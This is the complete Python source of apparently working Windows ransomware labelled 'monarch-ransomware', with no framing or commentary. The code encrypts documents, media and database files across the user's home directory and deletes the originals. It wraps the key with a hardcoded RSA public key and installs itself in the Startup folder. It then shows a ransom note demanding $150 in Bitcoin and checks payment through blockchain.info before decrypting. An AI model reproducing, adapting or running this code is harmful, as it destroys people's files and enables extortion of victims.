import hashlib
import base64
import getpass
import shutil
import os
import time
import ctypes
import win32con
import urllib.request
from pathlib import Path
from cryptography.hazmat.backends import default_backend  
from cryptography.hazmat.primitives.asymmetric import rsa  
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.serialization import load_pem_private_key
from cryptography.hazmat.primitives.serialization import load_pem_public_key
from cryptography.fernet import Fernet
import tkinter as tk

btc_addy = base64.b64decode(open("main.exe",'rb').read().split(b"|||")[-1]).decode()
#reads the program file and pulls appended bytes after delimiter that contain the bitcoin payout address

tpath = str(Path.home())
#gets target home directory path

message = f"""
your computer has ransomware.
your files have been encrypted
if you want them back you will have to
pay $150 usd to this bitcoin address:

    {btc_addy}

once you have made your payment 
you will receive a transaction id,
paste your transaction id into the window bellow
and press authenticate to start the decryption
"""

def popupmsg(msg):
    #alerts user
    popup = tk.Tk()
    popup.wm_title("!")
    label = tk.Label(popup, text=msg, font=("Verdana", 10))
    label.pack(side="top", fill="x", pady=10)
    B1 = tk.Button(popup, text="OK", command = popup.destroy)
    B1.pack()
    popup.mainloop()

def asym_encrypt(data):
    #encrypts data with hardcoded asymetric public key
    public=b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2FuCTS9WVL9V2a9Gjc8x
OjAC/cwcz8aX1Fc7IBtZ1ef9Ovg/el3PZ3nQgTaCRnxUfAWf1WrkjQRq25ESch5A
McZ5KzxJd850z8756i1tgrQ/V/3bIfZWPPiOJqDOFpnD8Ad/tClvixJ7B5BYxygL
TjOTd2vPTf5QUiuHOxUE/bPkr1o/vvP3kMuj9hnx/maH4TO+gB36VbpCOS81FnGn
GuGj8DOGsyHgMWJHzQ1FA5+hMJjsKyHQMQVCcWjkRj6Anw1Ee7ckq+OkvFQ7MvCF
8aDhOsCq0alu0EXolkDJADwK36gtV60i+IK0xlDoqsNxlr3lDYzEgEUVNRsOPcmL
FQIDAQAB
-----END PUBLIC KEY-----"""
    client_key = load_pem_public_key(public,backend=default_backend())
    return(base64.b64encode(client_key.encrypt(data,padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),algorithm=hashes.SHA256(),label=None))).decode())

def asym_decrypt(data,key):
    #decrypts hardcoded asymetric RSA key with fernet key generated from b64 encoded md5 checksum 
    try:
        FR = Fernet(base64.b64encode(hashlib.md5(key.encode('utf-8')).hexdigest().encode()))
        private = FR.decrypt(b'gAAAAABgT4E8mgVeJqH_blwQ9StOeluvbCPGXLBhhWpKh7P5cEj--fSPT9-h4iXddV7-H_6BGAIz04w1BJ_IuTSXhqGVYdjKWUsW04hqvKYeVvZjkPiTnw8d1O3MOmZs73SID77iwaMr9f-3L2e4IWRwu8gymZYkDNeoXURIjkYJE1s3Vi1zGicgqLLY4dcmvV_pbmRRtnDgbSjsNOobE4dQ0gd_irFRVgGQ0mCk9QHo0jv5g8mFwvLNYWwzMUz-63L6lbdoZ5zSyctqfBTR-fyxiy2aPgzBlnd1YuahH1uSLn_Z-yk2N0i0smm3Lzx_b1sh34bbEz74a3SIMiJ3NWH-cRRF2p_6atGTIS3-KOjR0XWNrcEoDHVasVX6pKPcy6T3l8xTFguA4EaL6spJvA54MxtCxKD5ToYtuq0fpPwikTuYWo3wmWgYjnu7xku3j5_qLfWqP4BvnS8AESmhVa2S8Kq0UirkxIAzP6u_2Yj4UlS36-qF5ai88ZctBz6W7sfw0H-a5GHQ7q7AQp2Kn3XWJVZrsJ-KznPsp7P-ZdNdw1q81yDUSIdailLFd8uUFajsbvylondYb2hpZRFoxB4jffHFu-qmsDIu7DuxrgGkpANZkpLTQP9WMQiCREEqBOBvvKAOWM84hpG9mxS3BrawX6aiskpHpvkMzymkfBgFlJmfrJc7pAPMtQQdXqTCQq8wZbSt54nu30kEo939H9utbNxKJolNi5tlddWzD934jF75Wpai4lAX4bLTZo_FRgLGbBlr_0uCpkzeklRj2nCu6zd50g-jzmNk9BUbuDTxHBdoiH38ANSXVXC66fZTCGWlzxmpE6hWEdIAZExwPyJoIwqnifC8KIg_yvMuRL78MC67vqa0z-mvnDBY4hxUkCH8x1V6tFoFtEcEhk2kUqBYphy-FrApftmJ0OTz2ausNgtaW6yVI_o8dLqyzcAKww5cubtoYUjybgL9lRjOqw4qxne-aRhd8sk5_a5f6YvNdF4FNuB6WrgY79kJF55IdU21tYqEjpc1g9XweQOpWr0FQB1JsErNgZ6aoLH_GBOtsy1Y9X8gqoEj1HJuiWFubHDEI4KnMNWcvofBJPCBJ5gi2VdlkKKBmRfAgTUwTuPasWJ0nsmSHSlk72_wu4Bu1miZxH_-zhQXxoLwUZq3RDyRCizxbCt9avl9wP5PmBzGgSA_q5W8eJA9RfDumtfLdNKp8VErSgYiYItkizbpKRGyc_UCBrcN3iCWRS1Lt7HJjncgeY4cjuqROjO0q09mL-z_83Zp4tvQGV-D3YiCqPwhjFWKzREXLG9yAuspsW6OnJUp9Ady2iOXcS8E9bn6p5pcdW3-NfR-N97B0eMJV3H2LXbQyaJh2z0f3GrrJStt67bA1gG0DeWpJNGFswoOexBWOwnES2eFzDcbg4QIzhNCL2dcXzsuZs0gwfz8PBUeN5Q6sD7mBrSHzMT80Or1NNDB3sVKNI24OjXAdcZr3ESTLQCO6GNY6n7Sw3Jg0gi0TvgBaoJmmwDupCUEJ0_3gobzvckWYXTIROwY6O9O_8aUyqJisGvfsJTCozm19vHpNiOQcn1GHZeExLE1OEPTkk0uzG6jhYLurjczPqxb_GfC-Z_fp3U-Q-Vk6TsIWuJf0Fnzz3uBQO0doGv5OhgnbzDFlIOwKoSdfdrxQaVVeiHA1ZY1N8xrwFgnulVpc33-rtlI8UYUJBdCUIDmvzQhKgWYp14tfqzBRUJ0kRXc-CxxYA9SvvwtAaeLNYHLRS0pSzXh_rtvd1WsMRatPPY-g1CBe--DnQGoA8ska1_SwNQbkatJ60e3OAR9UqVWcCmNNk-H7Q5cwK_Tr9vg6pikaOvHa5FzSxzAr6QZYiIZiWZnXe9pJNCEJEbqkFf2nsncEzbiCkNrKGmoDlQ-QGGLhtn9fUM3jL7teqM2Iwlgr4sf-qtgTKZyLyqruuBDEXKsR-dE7zxtE1KXMejg-0z-TzG3eO1oZIKaQ_rVFz0ez7GqVnwpLB63aaic6r-wEZPiCcTGCMn4AiVdCsflSL6Ap1jxoa4COJxgGWWtHsKg4BRr_9W2eGL9SFdhh2fE70udmkv3KiQKV8NY6BTK4xPOxn5FClImYZCmzM5JxK8b2I5f0w4Jo6mPpJUcugP29f3DUBL09im1wSn351VVBpzqU2OwZrufXnpTw_NsMojDdMGmudT_vfK_SESNzCeJtP6KZ3q9-IVIUojRb0BoHbk2aOqqa0CgWlSJ1GPeOE68HnbqG0i6UY_iwdbX836izcrx4uhZrHtjoyew2f5knCR7A1nvgf43GQT1')
        private_key = serialization.load_pem_private_key(private,password=None,backend=default_backend())
        return(private_key.decrypt(base64.b64decode(data),padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),algorithm=hashes.SHA256(),label=None)).decode())
        popupmsg("decrypt started")
    except:
        pass

def genkey():
    #generates new symetric Fernet key (AES) that is used for file encryption
    global sym_key
    sym_key = Fernet.generate_key()
    open("KF",'wb').write(asym_encrypt(sym_key).encode())
    return(smy_key)

def sym_decrypt(key):
    #discovers encrypted files in target directory, then decrypts them with the symetric fernet key 
    for r,d,f in os.walk(tpath):
        for i in f:
            path = os.path.join(r,i)
            if ".fml" in i:
                try:
                    o = open(path, "rb")
                    k = Fernet(key)
                    plaintext = base64.b64decode(k.decrypt(o.read()))
                    o.close()
                    os.remove(path)
                    name = str(path)
                    newfilepath = name.split(".fml")[0]
                    f = open(newfilepath, "wb")
                    f.write(plaintext)
                    f.close()
                    print("DECRYPTED: " + path)
                except:
                    pass
            else:
                pass

def remove_startup():
    #removes startup persistence 
    usr = getpass.getuser()
    os.system(f"del \"C:\\Users\\{usr}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\demo1.exe\"")
    os.system(f"del \"C:\\Users\\{usr}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KF\"")
    os.system("del \"KF\"")
    print("STARTUP DELETED")


def check_trans(addy, txid):
    #grabs json file for address transaction history and checks for a given transaction
    url = f"https://blockchain.info/rawaddr/{addy}"
    response = urllib.request.urlopen(url)
    WC = response.read()
    for thing in WC.decode().split("\""):
        if txid in thing:
            return("Y")
        else:
            pass
    return("N")

def getkey():
    #GUI which dislplays a ransom message and collects the transaction id then calls functions that decrypt files
    global kenter
    root = tk.Tk()
    root.geometry("800x600")
    root.title('monarch-ransomware')
    root.configure(bg='black')
    T = tk.Text(root, height=14, width=50)
    T.tag_config("here", background="black", foreground="green")
    T.insert(tk.END,message)
    T.pack()
    e2 = tk.Entry(root)
    e2.pack()
    def getTextInput():
        while True:
            dat = open("KF","rb").read()
            check = check_trans(btc_addy,e2.get())
            T.insert(tk.END,"\ntrying decryption...")

            key = "wXrYEG3Zv4Q7Jp4FyTyr35CdYHD3BSkK"
            #this makes the secure hardcoding worthless but i need it here in order
            #to use the automated btc decryption

            if check == "Y":
                T.insert(tk.END,"\nTRANSACTION VALID, UNLOCKING FILES")
                sym_decrypt(asym_decrypt(dat,key))
                T.insert(tk.END,"\nfiles have been unlocked...\nplease close window")
                remove_startup()
                break
            else:
                T.insert(tk.END,"no such transaction, please try again")

    tk.Button(root, height=1, width=15, text="authenticate", command=getTextInput).pack()
    root.mainloop()
    
def sym_encrypt(file,sym_key):
    #reads file data and encrypts the data before writing to a new file and deleting the plaintext file
    try:
        o = open(file,"rb")
        k = Fernet(sym_key)
        encrypted = k.encrypt(base64.b64encode(o.read()))
        o.close()
        os.remove(file)
        newfilepath = "{}.fml".format(file)
        f = open(newfilepath, "w+")
        f.write(encrypted.decode())
        f.close()
    except:
        pass
        
def main(key):
    #finds target files in target directory then uses the sym_encrypt function to encrypt the tatget files
    target_extensions = [".doc",".pdf",".wav",".mp3",".mp4",".rar",".iso",".xml",".db",".sql",".psd",".jpeg",".jpg",".png",".gif",".html",".php",".txt",".rtf",".odt",".xls",".csv",".docx"]
    for extension in target_extensions:
        for r,d,f in os.walk(tpath):
            for i in f:
                path = os.path.join(r,i)
                if extension in i:
                    print("ENCRYPTED: "+path)
                    sym_encrypt(path,key)
                else:
                    pass

def put_startup():
    #creates startup persistence
    usr = getpass.getuser()
    os.system(f"COPY /B \"demo1.exe\" \"C:\\Users\\{usr}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\demo1.exe\"")
    os.system(f"COPY /B \"KF\" \"C:\\Users\\{usr}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KF\"")
    print("STARTUP INSTALLED")
 
def crypto_main():
    if os.path.exists("KF"):
        return(getkey())
    else:
        global sym_key
        sym_key = Fernet.generate_key()
        open("KF",'wb').write(asym_encrypt(sym_key).encode())
        main(sym_key)
        put_startup()
        getkey()


print(crypto_main())
